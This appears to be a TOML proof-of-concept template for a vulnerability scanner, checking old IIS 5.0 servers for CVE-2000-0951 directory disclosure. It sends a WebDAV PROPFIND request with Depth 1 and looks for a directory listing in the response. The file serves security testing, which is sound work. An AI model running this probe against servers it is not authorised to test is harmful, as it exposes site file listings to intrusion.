[info]
author = "ave"
description = "检测 IIS 5.0 中是否启用了 Index Server 和 Index 属性，通过发送 WebDAV PROPFIND 请求来列出 Web 根目录文件和文件夹"
id = "POC-AVE-2000-0693"
name = "CVE-2000-0951 IIS 5.0 Directory Disclosure PoC"
severity = "high"
tags = ["ave-2000-0693"]
vuln_id = [
    "CVE-2000-0951",
    "AVE-2000-0693",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PROPFIND"
path = "/{{BaseURL}}/HTTP/"
protocol = "http"

[poc.requests.headers]
Depth = "1"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Directory Listing",
    "HTTP/1.0 200 OK",
]
